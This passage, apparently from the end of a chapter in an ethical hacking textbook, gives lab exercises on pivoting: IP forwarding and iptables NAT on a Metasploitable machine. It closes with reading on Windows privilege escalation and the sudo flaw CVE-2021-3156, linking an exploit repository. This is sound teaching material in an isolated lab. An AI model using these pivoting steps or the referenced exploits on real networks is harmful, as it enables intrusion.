		<p class="indent">What about the hashes that you couldn’t crack? You might still be able to use them to perform other attacks, such as the <em>pass-the-hash attacks</em> that we’ll look at in <a href="ch15.xhtml#ch15">Chapter 15</a>.</p>
		<h3 class="h3" id="ch14lev9"><strong>Exercises</strong></h3>
		<p class="noindent">These exercises are designed to enhance your understanding of privilege escalations and pivoting. In the first exercise, you extend your Metasploitable machine so that it can route traffic out of the private network, transforming it into a fully functional router. The second exercise provides some suggested reading on privilege escalation for Windows devices.</p>
		<h4 class="h4" id="ch14lev10"><strong><em>Adding NAT to Your Dual-Homed Device</em></strong></h4>
		<p class="noindent">Allow your dual-homed device to route packets out of the private network, as a router would, by enabling NAT. First, you must enable IP forwarding:</p>
		<pre>msfadmin@metasploitable:~$ echo 1 &gt; <span class="codestrong1">/proc/sys/net/ipv4/ip_forward</span></pre>
		<p class="indent">As in the ARP spoofing attack you performed in <a href="ch02.xhtml#ch2">Chapter 2</a>, we need to enable <code>ip_forward</code> so that the machine can accept and forward packets that <span epub:type="pagebreak" id="page_304"/>don’t match its IP address. Next, set <code>iptables</code> to allow the Metasploitable virtual machine to route packets from your private network to your virtual environment’s internal network:</p>
		<pre>msfadmin@metasploitable:~$ <span class="codestrong1">iptables -t nat -A POSTROUTING -s 10.0.0.0/24 -o eth1 -j MASQUERADE</span></pre>
		<p class="indent">Check to see whether you can access the outside world by pinging the pfSense firewall from your Ubuntu virtual machine in the private LAN:</p>
		<pre>victim@ubuntu:~$ <span class="codestrong1">ping 192.168.1.1</span></pre>
		<h4 class="h4" id="ch14lev11"><strong><em>Suggested Reading on Windows Privilege Escalation</em></strong></h4>
		<p class="noindent">Check out Hanno Heinrichs’ blog post “Exploiting GlobalProtect for Privilege Escalation, Part One: Windows” at <em><a href="https://www.crowdstrike.com/blog/exploiting-escalation-of-privileges-via-globalprotect-part-1/">https://www.crowdstrike.com/blog/exploiting-escalation-of-privileges-via-globalprotect-part-1/</a></em>. Crowdstrike’s blog is a great place to find information on new vulnerabilities.</p>
		<p class="indent">Another great privilege escalation bug is the Sudo buffer overflow bug (CVE-2021-3156); you can read more about it here: <em><a href="https://github.com/stong/CVE-2021-3156">https://github.com/stong/CVE-2021-3156</a></em>.</p>
	</body>
</html>